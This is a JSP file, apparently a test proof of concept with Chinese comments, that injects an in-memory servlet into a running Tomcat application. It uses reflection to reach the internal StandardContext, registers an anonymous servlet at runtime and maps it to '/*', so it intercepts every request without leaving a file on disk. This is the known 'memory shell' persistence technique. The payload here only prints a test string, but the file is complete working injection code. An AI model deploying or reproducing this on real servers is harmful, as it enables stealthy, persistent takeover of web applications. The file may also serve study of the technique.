<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="org.apache.catalina.connector.Request" %>
<%@ page import="org.apache.catalina.Wrapper" %>
<%@ page import="java.io.IOException" %>
<%@ page import="java.util.Arrays" %>
<%
    // context
    Field f = request.getClass().getDeclaredField("request");
    f.setAccessible(true);//因为是protected
    Request req = (Request) f.get(request);//反射获取值
    StandardContext context = (StandardContext) req.getContext(); //直接通过request获取StandardContext

    // servlet
    Servlet servlet = new Servlet() {
        @Override
        public void init(ServletConfig servletConfig) throws ServletException {

        }

        @Override
        public ServletConfig getServletConfig() {
            return null;
        }

        @Override
        public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException {
            servletResponse.getWriter().println("servlet_xjj_test");
        }

        @Override
        public String getServletInfo() {
            return null;
        }

        @Override
        public void destroy() {

        }
    };

    Wrapper wrapper = context.createWrapper();
    wrapper.setLoadOnStartup(1);
    wrapper.setServlet(servlet);
    wrapper.setServletClass(servlet.getClass().getName());
    wrapper.setName("xjjWrapper");


//    // 没用
//    Wrapper[] children = (Wrapper[]) context.getChildren();
//    long count = Arrays.stream(children).filter(c -> c.getName().equals("xjjWrapper")).count();
//    if (count == 1) {
//        return;
//    }
    context.addChild(wrapper); // 父子容器记得关联
    // 添加servlet映射
    context.addServletMappingDecoded("/*", "xjjWrapper");
%>